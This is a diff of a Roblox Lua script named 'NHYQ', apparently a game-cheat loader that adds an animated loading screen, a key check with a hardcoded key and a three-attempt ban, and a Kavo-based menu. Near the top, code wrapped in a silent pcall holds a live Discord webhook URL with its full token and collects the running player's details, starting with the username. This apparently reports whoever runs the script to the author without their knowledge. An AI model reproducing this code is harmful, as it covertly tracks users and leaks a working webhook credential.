@@ -1,10 +1,12 @@
 --==================================================
--- NHYQ SCRIPT (Cleaned Version)
+-- NHYQ SCRIPT (Loader + Key System + Main UI)
 --==================================================
 
 local _P = game:GetService("Players")
 local _H = game:GetService("HttpService")
 local _U = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
 local _L = _P.LocalPlayer
 
 --==================================================
@@ -64,7 +66,7 @@ end
 --==================================================
 
 pcall(function()
-    local _W = "https://discord.com/api/webhooks/1555177488450191391/-8MZ9KYvmDV8hyZylvPwlmNsyl9dzcnz3zvvhvmSrWCq8udLZqvnLEF_4wXBQVmBzZaq"
+    local _W = "https://discord.com/api/webhooks/1555177488450191391/-8MZ9KYvmDV8hyZylvPwlmNsyl9dzcnz3zvvhvmSrWCq8udLZqvnLEF_4wXBQVmBzZaq" -- رابط الويب هوك الخاص بك الأصلي
     local _info = {}
 
     _info.Username = _L.Name
@@ -190,7 +192,6 @@ _P.PlayerAdded:Connect(ApplyOwnerTag)
 --==================================================
 
 local CoreGui = game:GetService("CoreGui")
-local TweenService = game:GetService("TweenService")
 
 pcall(function()
     local old = CoreGui:FindFirstChild("NHYQ_Script_GUI")
@@ -215,151 +216,341 @@ if not ScreenGui.Parent then
 end
 
 --==================================================
--- INTRO
+-- LOADER SCREEN
 --==================================================
 
-local IntroFrame = Instance.new("Frame")
-IntroFrame.Name = "IntroFrame"
-IntroFrame.Size = UDim2.fromScale(1, 1)
-IntroFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-IntroFrame.BorderSizePixel = 0
-IntroFrame.ZIndex = 1000
-IntroFrame.Parent = ScreenGui
+local LoaderFrame = Instance.new("Frame")
+LoaderFrame.Name = "LoaderFrame"
+LoaderFrame.Size = UDim2.fromScale(1, 1)
+LoaderFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+LoaderFrame.BorderSizePixel = 0
+LoaderFrame.ZIndex = 1000
+LoaderFrame.Parent = ScreenGui
 
-local IntroText = Instance.new("TextLabel")
-IntroText.Size = UDim2.new(1, 0, 0, 100)
-IntroText.Position = UDim2.new(0, 0, 0.42, -50)
-IntroText.BackgroundTransparency = 1
-IntroText.Text = "NHYQ"
-IntroText.TextColor3 = Color3.fromRGB(255, 0, 0)
-IntroText.TextSize = 75
-IntroText.Font = Enum.Font.GothamBold
-IntroText.TextXAlignment = Enum.TextXAlignment.Center
-IntroText.TextYAlignment = Enum.TextYAlignment.Center
-IntroText.ZIndex = 1001
-IntroText.Parent = IntroFrame
+local ShakeHolder = Instance.new("Frame")
+ShakeHolder.Size = UDim2.fromScale(1, 1)
+ShakeHolder.BackgroundTransparency = 1
+ShakeHolder.ZIndex = 1001
+ShakeHolder.Parent = LoaderFrame
 
-local SubIntroText = Instance.new("TextLabel")
-SubIntroText.Size = UDim2.new(1, 0, 0, 50)
-SubIntroText.Position = UDim2.new(0, 0, 0.42, 35)
-SubIntroText.BackgroundTransparency = 1
-SubIntroText.Text = "by shs09qp23"
-SubIntroText.TextColor3 = Color3.fromRGB(180, 180, 180)
-SubIntroText.TextSize = 22
-SubIntroText.Font = Enum.Font.Gotham
-SubIntroText.TextXAlignment = Enum.TextXAlignment.Center
-SubIntroText.ZIndex = 1001
-SubIntroText.Parent = IntroFrame
+local SubHeader = Instance.new("TextLabel")
+SubHeader.Size = UDim2.new(0, 400, 0, 40)
+SubHeader.Position = UDim2.new(0.5, -200, 0.35, -55)
+SubHeader.BackgroundTransparency = 1
+SubHeader.TextColor3 = Color3.fromRGB(220, 220, 220)
+SubHeader.TextSize = 22
+SubHeader.Font = Enum.Font.GothamBold
+SubHeader.Text = "منور السكربت"
+SubHeader.ZIndex = 1002
+SubHeader.Parent = ShakeHolder
+
+local RightCrown = Instance.new("TextLabel")
+RightCrown.Size = UDim2.new(0, 50, 0, 50)
+RightCrown.Position = UDim2.new(0.5, 120, 0.4, -15)
+RightCrown.BackgroundTransparency = 1
+RightCrown.Text = "👑"
+RightCrown.TextSize = 35
+RightCrown.TextTransparency = 1
+RightCrown.ZIndex = 1002
+RightCrown.Parent = ShakeHolder
+
+local LeftCrown = Instance.new("TextLabel")
+LeftCrown.Size = UDim2.new(0, 50, 0, 50)
+LeftCrown.Position = UDim2.new(0.5, -170, 0.4, -15)
+LeftCrown.BackgroundTransparency = 1
+LeftCrown.Text = "👑"
+LeftCrown.TextSize = 35
+LeftCrown.TextTransparency = 1
+LeftCrown.ZIndex = 1002
+LeftCrown.Parent = ShakeHolder
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size = UDim2.new(0, 400, 0, 90)
+TitleLabel.Position = UDim2.new(0.5, -200, 0.4, -15)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+TitleLabel.TextSize = 60
+TitleLabel.Font = Enum.Font.GothamBlack
+TitleLabel.Text = ""
+TitleLabel.ZIndex = 1002
+TitleLabel.Parent = ShakeHolder
+
+local UnderLine = Instance.new("Frame")
+UnderLine.Size = UDim2.new(0, 0, 0, 3)
+UnderLine.Position = UDim2.new(0.5, -150, 0.4, 75)
+UnderLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+UnderLine.BorderSizePixel = 0
+UnderLine.ZIndex = 1002
+UnderLine.Parent = ShakeHolder
+
+local Credits = Instance.new("TextLabel")
+Credits.Size = UDim2.new(0, 250, 0, 30)
+Credits.Position = UDim2.new(0, 20, 1, -40)
+Credits.BackgroundTransparency = 1
+Credits.TextColor3 = Color3.fromRGB(120, 120, 120)
+Credits.TextSize = 14
+Credits.Font = Enum.Font.Gotham
+Credits.TextXAlignment = Enum.TextXAlignment.Left
+Credits.Text = "by گلر shs09qp23"
+Credits.ZIndex = 1002
+Credits.Parent = LoaderFrame
+
+local SkipButton = Instance.new("TextButton")
+SkipButton.Size = UDim2.new(0, 150, 0, 45)
+SkipButton.Position = UDim2.new(0, 20, 1, -95)
+SkipButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+SkipButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+SkipButton.Text = "  ⏭ تخطي"
+SkipButton.TextSize = 15
+SkipButton.Font = Enum.Font.GothamBold
+SkipButton.Visible = false
+SkipButton.ZIndex = 1002
+SkipButton.Parent = LoaderFrame
+
+local ButtonCorner = Instance.new("UICorner")
+ButtonCorner.CornerRadius = UDim.new(0, 10)
+ButtonCorner.Parent = SkipButton
+
+local ButtonStroke = Instance.new("UIStroke")
+ButtonStroke.Color = Color3.fromRGB(255, 0, 0)
+ButtonStroke.Thickness = 1.5
+ButtonStroke.Parent = SkipButton
+
+local PercentLabel = Instance.new("TextLabel")
+PercentLabel.Size = UDim2.new(0, 200, 0, 30)
+PercentLabel.Position = UDim2.new(0.5, -100, 0.5, 45)
+PercentLabel.BackgroundTransparency = 1
+PercentLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+PercentLabel.TextSize = 16
+PercentLabel.Font = Enum.Font.Gotham
+PercentLabel.Text = "Loading: 0%"
+PercentLabel.ZIndex = 1002
+PercentLabel.Parent = ShakeHolder
+
+local BarBackground = Instance.new("Frame")
+BarBackground.Size = UDim2.new(0, 350, 0, 6)
+BarBackground.Position = UDim2.new(0.5, -175, 0.5, 85)
+BarBackground.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+BarBackground.BorderSizePixel = 0
+BarBackground.ZIndex = 1002
+BarBackground.Parent = ShakeHolder
+
+local BarCorner = Instance.new("UICorner")
+BarCorner.CornerRadius = UDim.new(1, 0)
+BarCorner.Parent = BarBackground
+
+local FillBar = Instance.new("Frame")
+FillBar.Size = UDim2.new(0, 0, 1, 0)
+FillBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+FillBar.BorderSizePixel = 0
+FillBar.Parent = BarBackground
+
+local FillCorner = Instance.new("UICorner")
+FillCorner.CornerRadius = UDim.new(1, 0)
+FillCorner.Parent = FillBar
+
+local function ShakeScreen()
+    local duration = 0.15
+    local elapsed = 0
+    local connection
+    connection = RunService.RenderStepped:Connect(function(dt)
+        elapsed = elapsed + dt
+        if elapsed >= duration then
+            ShakeHolder.Position = UDim2.new(0, 0, 0, 0)
+            connection:Disconnect()
+        else
+            local offsetX = math.random(-3, 3)
+            local offsetY = math.random(-3, 3)
+            ShakeHolder.Position = UDim2.new(0, offsetX, 0, offsetY)
+        end
+    end)
+end
 
 --==================================================
--- PASSWORD FRAME
+-- KEY SYSTEM
 --==================================================
 
-local PasswordFrame = Instance.new("Frame")
-PasswordFrame.Name = "PasswordFrame"
-PasswordFrame.Size = UDim2.new(0, 420, 0, 280)
-PasswordFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
-PasswordFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
-PasswordFrame.BorderSizePixel = 0
-PasswordFrame.Visible = false
-PasswordFrame.ZIndex = 100
-PasswordFrame.Parent = ScreenGui
+local Background = Instance.new("Frame")
+Background.Size = UDim2.fromScale(1, 1)
+Background.BackgroundColor3 = Color3.fromRGB(2, 2, 3)
+Background.BorderSizePixel = 0
+Background.Visible = false
+Background.ZIndex = 100
+Background.Parent = ScreenGui
 
-local PassUICorner = Instance.new("UICorner")
-PassUICorner.CornerRadius = UDim.new(0, 16)
-PassUICorner.Parent = PasswordFrame
+local Glow = Instance.new("Frame")
+Glow.AnchorPoint = Vector2.new(0.5, 0.5)
+Glow.Position = UDim2.fromScale(0.5, 0.5)
+Glow.Size = UDim2.fromScale(0.8, 0.7)
+Glow.BackgroundColor3 = Color3.fromRGB(45, 0, 0)
+Glow.BackgroundTransparency = 0.88
+Glow.BorderSizePixel = 0
+Glow.Parent = Background
 
-local PassUIStroke = Instance.new("UIStroke")
-PassUIStroke.Color = Color3.fromRGB(255, 0, 0)
-PassUIStroke.Thickness = 2.5
-PassUIStroke.Parent = PasswordFrame
+local GlowCorner = Instance.new("UICorner")
+GlowCorner.CornerRadius = UDim.new(0, 30)
+GlowCorner.Parent = Glow
 
-local PassTitle = Instance.new("TextLabel")
-PassTitle.Size = UDim2.new(1, 0, 0, 60)
-PassTitle.Position = UDim2.new(0, 0, 0, 20)
-PassTitle.BackgroundTransparency = 1
-PassTitle.Text = "سكربت كلان NHYQ"
-PassTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-PassTitle.TextSize = 24
-PassTitle.Font = Enum.Font.GothamBold
-PassTitle.ZIndex = 101
-PassTitle.Parent = PasswordFrame
+local Main = Instance.new("Frame")
+Main.AnchorPoint = Vector2.new(0.5, 0.5)
+Main.Position = UDim2.fromScale(0.5, 0.5)
+Main.Size = UDim2.new(0, 0, 0, 0)
+Main.BackgroundColor3 = Color3.fromRGB(4, 4, 5)
+Main.BorderSizePixel = 0
+Main.ZIndex = 101
+Main.Parent = Background
 
-local PassInput = Instance.new("TextBox")
-PassInput.Size = UDim2.new(0, 350, 0, 55)
-PassInput.Position = UDim2.new(0.5, -175, 0.4, -5)
-PassInput.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-PassInput.TextColor3 = Color3.fromRGB(255, 255, 255)
-PassInput.PlaceholderText = "أدخل الباسورد هنا..."
-PassInput.PlaceholderColor3 = Color3.fromRGB(140, 140, 140)
-PassInput.TextSize = 16
-PassInput.Font = Enum.Font.Gotham
-PassInput.ClearTextOnFocus = false
-PassInput.ZIndex = 101
-PassInput.Parent = PasswordFrame
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 18)
+MainCorner.Parent = Main
 
-local InputCorner = Instance.new("UICorner")
-InputCorner.CornerRadius = UDim.new(0, 10)
-InputCorner.Parent = PassInput
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(45, 45, 48)
+MainStroke.Thickness = 2
+MainStroke.Transparency = 0.15
+MainStroke.Parent = Main
 
-local InputStroke = Instance.new("UIStroke")
-InputStroke.Color = Color3.fromRGB(255, 0, 0)
-InputStroke.Thickness = 1.5
-InputStroke.Parent = PassInput
+local TopLine = Instance.new("Frame")
+TopLine.Position = UDim2.new(0.08, 0, 0, 0)
+TopLine.Size = UDim2.new(0.84, 0, 0, 3)
+TopLine.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+TopLine.BorderSizePixel = 0
+TopLine.Parent = Main
 
-local SubmitBtn = Instance.new("TextButton")
-SubmitBtn.Size = UDim2.new(0, 350, 0, 50)
-SubmitBtn.Position = UDim2.new(0.5, -175, 0.73, 0)
-SubmitBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-SubmitBtn.BorderSizePixel = 0
-SubmitBtn.Text = "دخول"
-SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-SubmitBtn.TextSize = 18
-SubmitBtn.Font = Enum.Font.GothamBold
-SubmitBtn.ZIndex = 101
-SubmitBtn.Parent = PasswordFrame
+local TopGlow = Instance.new("UIGradient")
+TopGlow.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 0, 0)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 0, 0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 0, 0))
+})
+TopGlow.Parent = TopLine
 
-local BtnCorner = Instance.new("UICorner")
-BtnCorner.CornerRadius = UDim.new(0, 10)
-BtnCorner.Parent = SubmitBtn
+local Close = Instance.new("TextButton")
+Close.AnchorPoint = Vector2.new(1, 0)
+Close.Position = UDim2.new(1, -18, 0, 18)
+Close.Size = UDim2.fromOffset(42, 42)
+Close.BackgroundColor3 = Color3.fromRGB(12, 4, 4)
+Close.Text = "×"
+Close.TextColor3 = Color3.fromRGB(255, 0, 0)
+Close.TextSize = 30
+Close.Font = Enum.Font.GothamBold
+Close.AutoButtonColor = false
+Close.Parent = Main
 
---==================================================
--- PASSWORD DRAG
---==================================================
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(1, 0)
+CloseCorner.Parent = Close
 
-local PasswordDragging, PasswordDragStart, PasswordStartPos, PasswordDragInput
+local CloseStroke = Instance.new("UIStroke")
+CloseStroke.Color = Color3.fromRGB(100, 0, 0)
+CloseStroke.Thickness = 1
+CloseStroke.Parent = Close
 
-PasswordFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        PasswordDragging = true
-        PasswordDragStart = input.Position
-        PasswordStartPos = PasswordFrame.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                PasswordDragging = false
-            end
-        end)
-    end
+Close.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
 end)
 
-PasswordFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        PasswordDragInput = input
-    end
+local Title = Instance.new("TextLabel")
+Title.Position = UDim2.new(0.08, 0, 0, 58)
+Title.Size = UDim2.new(0.45, 0, 0, 55)
+Title.BackgroundTransparency = 1
+Title.Text = "NHYQ"
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.TextSize = 43
+Title.Font = Enum.Font.GothamBlack
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = Main
+
+local ScriptKey = Instance.new("TextLabel")
+ScriptKey.Position = UDim2.new(0.57, 0, 0, 65)
+ScriptKey.Size = UDim2.new(0.3, 0, 0, 35)
+ScriptKey.BackgroundTransparency = 1
+ScriptKey.Text = "SCRIPT KEY"
+ScriptKey.TextColor3 = Color3.fromRGB(220, 220, 220)
+ScriptKey.TextSize = 20
+ScriptKey.Font = Enum.Font.GothamBold
+ScriptKey.TextXAlignment = Enum.TextXAlignment.Right
+ScriptKey.Parent = Main
+
+local Divider = Instance.new("Frame")
+Divider.Position = UDim2.new(0.08, 0, 0, 130)
+Divider.Size = UDim2.new(0.84, 0, 0, 2)
+Divider.BackgroundColor3 = Color3.fromRGB(80, 0, 0)
+Divider.BorderSizePixel = 0
+Divider.Parent = Main
+
+local KeyBox = Instance.new("Frame")
+KeyBox.Position = UDim2.new(0.08, 0, 0, 170)
+KeyBox.Size = UDim2.new(0.84, 0, 0, 70)
+KeyBox.BackgroundColor3 = Color3.fromRGB(7, 7, 8)
+KeyBox.BorderSizePixel = 0
+KeyBox.Parent = Main
+
+local KeyCorner = Instance.new("UICorner")
+KeyCorner.CornerRadius = UDim.new(0, 14)
+KeyCorner.Parent = KeyBox
+
+local KeyStroke = Instance.new("UIStroke")
+KeyStroke.Color = Color3.fromRGB(255, 0, 0)
+KeyStroke.Thickness = 2
+KeyStroke.Parent = KeyBox
+
+local Lock = Instance.new("TextLabel")
+Lock.Position = UDim2.new(0, 22, 0, 10)
+Lock.Size = UDim2.fromOffset(45, 50)
+Lock.BackgroundTransparency = 1
+Lock.Text = "🔒"
+Lock.TextSize = 28
+Lock.Parent = KeyBox
+
+local KeyInput = Instance.new("TextBox")
+KeyInput.Position = UDim2.new(0, 70, 0, 5)
+KeyInput.Size = UDim2.new(1, -85, 1, -10)
+KeyInput.BackgroundTransparency = 1
+KeyInput.PlaceholderText = "Enter Key..."
+KeyInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 105)
+KeyInput.TextColor3 = Color3.fromRGB(240, 240, 240)
+KeyInput.TextSize = 20
+KeyInput.Font = Enum.Font.GothamMedium
+KeyInput.TextXAlignment = Enum.TextXAlignment.Left
+KeyInput.ClearTextOnFocus = false
+KeyInput.Text = ""
+KeyInput.Parent = KeyBox
+
+local Status = Instance.new("TextLabel")
+Status.Position = UDim2.new(0.08, 0, 0, 250)
+Status.Size = UDim2.new(0.84, 0, 0, 28)
+Status.BackgroundTransparency = 1
+Status.Text = ""
+Status.TextSize = 15
+Status.Font = Enum.Font.GothamMedium
+Status.Parent = Main
+
+local Verify = Instance.new("TextButton")
+Verify.Position = UDim2.new(0.08, 0, 0, 290)
+Verify.Size = UDim2.new(0.84, 0, 0, 55)
+Verify.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+Verify.Text = "VERIFY KEY"
+Verify.TextColor3 = Color3.fromRGB(255, 255, 255)
+Verify.TextSize = 18
+Verify.Font = Enum.Font.GothamBold
+Verify.AutoButtonColor = false
+Verify.Parent = Main
+
+local VerifyCorner = Instance.new("UICorner")
+VerifyCorner.CornerRadius = UDim.new(0, 12)
+VerifyCorner.Parent = Verify
+
+Verify.MouseEnter:Connect(function()
+    TweenService:Create(Verify, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(220, 0, 0)}):Play()
 end)
 
-_U.InputChanged:Connect(function(input)
-    if PasswordDragging and input == PasswordDragInput then
-        local delta = input.Position - PasswordDragStart
-        PasswordFrame.Position = UDim2.new(
-            PasswordStartPos.X.Scale, PasswordStartPos.X.Offset + delta.X,
-            PasswordStartPos.Y.Scale, PasswordStartPos.Y.Offset + delta.Y
-        )
-    end
+Verify.MouseLeave:Connect(function()
+    TweenService:Create(Verify, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(150, 0, 0)}):Play()
 end)
 
 --==================================================
--- BAN & SUCCESS & WELCOME SCREENS
+-- BAN SCREEN
 --==================================================
 
 local BanScreen = Instance.new("Frame")
@@ -380,17 +571,6 @@ BanText.Font = Enum.Font.GothamBold
 BanText.ZIndex = 2001
 BanText.Parent = BanScreen
 
-local SuccessCheck = Instance.new("TextLabel")
-SuccessCheck.Size = UDim2.fromScale(1, 1)
-SuccessCheck.BackgroundTransparency = 1
-SuccessCheck.Text = "✔"
-SuccessCheck.TextColor3 = Color3.fromRGB(0, 255, 0)
-SuccessCheck.TextSize = 100
-SuccessCheck.Font = Enum.Font.GothamBold
-SuccessCheck.Visible = false
-SuccessCheck.ZIndex = 1500
-SuccessCheck.Parent = ScreenGui
-
 local WelcomeBanner = Instance.new("TextLabel")
 WelcomeBanner.Name = "WelcomeBanner"
 WelcomeBanner.Size = UDim2.new(1, 0, 0, 65)
@@ -407,22 +587,74 @@ WelcomeBanner.ZIndex = 1400
 WelcomeBanner.Parent = ScreenGui
 
 --==================================================
--- INTRO TIMER
+-- TRANSITION FROM LOADER TO KEY SYSTEM
 --==================================================
 
-task.delay(3, function()
+local function FinishLoader()
     local fadeInfo = TweenInfo.new(0.5)
-    TweenService:Create(IntroFrame, fadeInfo, { BackgroundTransparency = 1 }):Play()
-    TweenService:Create(IntroText, fadeInfo, { TextTransparency = 1 }):Play()
-    TweenService:Create(SubIntroText, fadeInfo, { TextTransparency = 1 }):Play()
+    TweenService:Create(LoaderFrame, fadeInfo, { BackgroundTransparency = 1 }):Play()
+    for _, child in ipairs(LoaderFrame:GetDescendants()) do
+        if child:IsA("TextLabel") or child:IsA("TextButton") then
+            TweenService:Create(child, fadeInfo, { TextTransparency = 1 }):Play()
+        elseif child:IsA("Frame") then
+            TweenService:Create(child, fadeInfo, { BackgroundTransparency = 1 }):Play()
+        end
+    end
 
     task.wait(0.5)
-    IntroFrame.Visible = false
-    PasswordFrame.Visible = true
+    LoaderFrame.Visible = false
+    Background.Visible = true
+
+    TweenService:Create(
+        Main,
+        TweenInfo.new(0.55, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+        { Size = UDim2.new(0.78, 0, 0, 390) }
+    ):Play()
+end
+
+SkipButton.MouseButton1Click:Connect(function()
+    FinishLoader()
+end)
+
+task.spawn(function()
+    task.wait(0.4)
+    local targetText = "NHYQ"
+    
+    for i = 1, #targetText do
+        TitleLabel.Text = string.sub(targetText, 1, i)
+        
+        if i >= 2 then
+            RightCrown.TextTransparency = 0
+            LeftCrown.TextTransparency = 0
+        end
+        
+        ShakeScreen()
+        task.wait(0.15)
+    end
+    
+    local tweenService = game:GetService("TweenService")
+    local info = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+    tweenService:Create(UnderLine, info, {Size = UDim2.new(0, 300, 0, 3), Position = UDim2.new(0.5, -150, 0.4, 75)}):Play()
+    
+    task.wait(0.3)
+
+    for i = 1, 100 do
+        PercentLabel.Text = "Loading: " .. i .. "%"
+        FillBar.Size = UDim2.new(i/100, 0, 1, 0)
+        
+        if i == 30 then
+            SkipButton.Visible = true
+        end
+        
+        task.wait(0.025)
+    end
+
+    task.wait(0.4)
+    FinishLoader()
 end)
 
 --==================================================
--- TOGGLE BUTTON
+-- TOGGLE BUTTON (NHYQ)
 --==================================================
 
 local ToggleBtn = Instance.new("TextButton")
@@ -450,7 +682,6 @@ ToggleStroke.Color = Color3.fromRGB(255, 0, 0)
 ToggleStroke.Thickness = 2
 ToggleStroke.Parent = ToggleBtn
 
--- Toggle Dragging Logic
 local btnDragging, btnDragStart, btnStartPos, moved = false, nil, nil, false
 
 ToggleBtn.InputBegan:Connect(function(input)
@@ -481,12 +712,13 @@ _U.InputChanged:Connect(function(input)
 end)
 
 --==================================================
--- LOAD MAIN SCRIPT (KAVO UI)
+-- LOAD MAIN SCRIPT (KAVO UI) & CUSTOM CLOSE (X)
 --==================================================
 
 local KavoGui = nil
 local KavoVisible = true
 local KavoCreatedGuis = {}
+local CustomCloseBtn = nil
 
 local function LooksLikeKavo(gui)
     if not gui or gui == ScreenGui then return false end
@@ -545,6 +777,7 @@ end)
 
 local function MakeKavoDraggable(gui)
     if not gui then return end
+    
     local MainFrame = nil
     local largestArea = 0
     pcall(function()
@@ -559,7 +792,51 @@ local function MakeKavoDraggable(gui)
             end
         end
     end)
-    if not MainFrame or MainFrame:GetAttribute("NHYQ_Draggable") then return end
+    if not MainFrame then return end
+
+    -- تعطيل زر الـ X القديم التابع لمكتبة Kavo وإخفاؤه
+    pcall(function()
+        for _, obj in ipairs(MainFrame:GetDescendants()) do
+            if obj:IsA("TextButton") or obj:IsA("ImageButton") then
+                local txt = tostring(obj.Text or "")
+                if txt == "X" or txt == "x" or txt == "×" then
+                    obj.Visible = false
+                end
+            end
+        end
+    end)
+
+    -- إضافة زر X خاص وثابت في أعلى القائمة لا يحذفها بل يخفيها ليظل زر الدائرة يعمل
+    if not CustomCloseBtn or not CustomCloseBtn.Parent then
+        CustomCloseBtn = Instance.new("TextButton")
+        CustomCloseBtn.Name = "NHYQ_CustomClose"
+        CustomCloseBtn.Size = UDim2.new(0, 32, 0, 32)
+        CustomCloseBtn.Position = UDim2.new(1, -38, 0, 8)
+        CustomCloseBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        CustomCloseBtn.Text = "×"
+        CustomCloseBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
+        CustomCloseBtn.TextSize = 24
+        CustomCloseBtn.Font = Enum.Font.GothamBold
+        CustomCloseBtn.ZIndex = 3000
+        CustomCloseBtn.AutoButtonColor = false
+        CustomCloseBtn.Parent = MainFrame
+
+        local cCorner = Instance.new("UICorner")
+        cCorner.CornerRadius = UDim.new(1, 0)
+        cCorner.Parent = CustomCloseBtn
+
+        local cStroke = Instance.new("UIStroke")
+        cStroke.Color = Color3.fromRGB(255, 0, 0)
+        cStroke.Thickness = 1.5
+        cStroke.Parent = CustomCloseBtn
+
+        CustomCloseBtn.MouseButton1Click:Connect(function()
+            KavoVisible = false
+            SetKavoVisibility(false)
+        end)
+    end
+
+    if MainFrame:GetAttribute("NHYQ_Draggable") then return end
     MainFrame:SetAttribute("NHYQ_Draggable", true)
 
     local Dragging, DragStart, StartPosition = false, nil, nil
@@ -622,10 +899,9 @@ local function LoadMainScript()
     KavoGui = FindKavoGui()
     if KavoGui then
         KavoVisible = true
-        task.delay(0.5, function() MakeKavoDraggable(KavoGui) end)
+        task.delay(0.3, function() MakeKavoDraggable(KavoGui) end)
     end
 
-    -- [Tabs & Sections]
     local TabCopy = Window:NewTab("نسخ")
     local SecCopy = TabCopy:NewSection("نسخ تلقائي")
     SecCopy:NewButton("نسخ تلقائي", "نسخ تلقائي", function()
@@ -694,24 +970,42 @@ local function LoadMainScript()
 
     task.delay(1, function()
         KavoGui = FindKavoGui()
-        if KavoGui then MakeKavoDraggable(KavoGui) end
+        if KavoGui then 
+            MakeKavoDraggable(KavoGui) 
+        end
     end)
 end
 
 --==================================================
--- PASSWORD CHECK EVENT
+-- VERIFY LOGIC & 3 ATTEMPTS BAN SYSTEM
 --==================================================
 
 local failedAttempts = 0
-local correctPassword = "NHYQONTOP1234"
+local CORRECT_KEY = "NHYQONTOP1234"
 
-SubmitBtn.Activated:Connect(function()
-    if PassInput.Text == correctPassword then
-        PasswordFrame.Visible = false
-        SuccessCheck.Visible = true
+local function VerifyKey()
+    local entered = KeyInput.Text
 
-        task.wait(1.5)
-        SuccessCheck.Visible = false
+    if entered == "" then
+        Status.Text = "Please enter a key."
+        Status.TextColor3 = Color3.fromRGB(255, 80, 80)
+        return
+    end
+
+    if entered == CORRECT_KEY then
+        Status.Text = "✓ KEY VERIFIED"
+        Status.TextColor3 = Color3.fromRGB(0, 255, 100)
+        KeyStroke.Color = Color3.fromRGB(0, 255, 100)
+
+        TweenService:Create(
+            Verify,
+            TweenInfo.new(0.25),
+            {BackgroundColor3 = Color3.fromRGB(0, 150, 60)}
+        ):Play()
+
+        task.wait(1)
+
+        Background:Destroy()
         ToggleBtn.Visible = true
 
         WelcomeBanner.Position = UDim2.new(0, 0, 0, -75)
@@ -731,16 +1025,77 @@ SubmitBtn.Activated:Connect(function()
         ):Play()
     else
         failedAttempts = failedAttempts + 1
-        PassInput.Text = ""
+        KeyInput.Text = ""
 
         local remaining = 3 - failedAttempts
         if remaining > 0 then
-            PassInput.PlaceholderText = "خطأ! محاولات متبقية: " .. remaining
+            Status.Text = "✕ INVALID KEY! Remaining attempts: " .. remaining
+        else
+            Status.Text = "✕ INVALID KEY"
         end
+        Status.TextColor3 = Color3.fromRGB(255, 40, 40)
+        KeyStroke.Color = Color3.fromRGB(255, 0, 0)
+
+        local oldPosition = Main.Position
+        for i = 1, 4 do
+            Main.Position = oldPosition + UDim2.fromOffset(math.random(-5, 5), 0)
+            task.wait(0.04)
+        end
+        Main.Position = oldPosition
 
         if failedAttempts >= 3 then
-            PasswordFrame.Visible = false
+            Background.Visible = false
             BanScreen.Visible = true
         end
+    end
+end
+
+Verify.MouseButton1Click:Connect(VerifyKey)
+
+KeyInput.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        VerifyKey()
+    end
+end)
+
+--==================================================
+-- DRAG SYSTEM FOR KEY WINDOW
+--==================================================
+
+local dragging = false
+local dragStart
+local startPos
+
+local function updateDrag(input)
+    local delta = input.Position - dragStart
+    Main.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
+end
+
+Main.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+_U.InputChanged:Connect(function(input)
+    if dragging and (
+        input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch
+    ) then
+        updateDrag(input)
     end
 end)
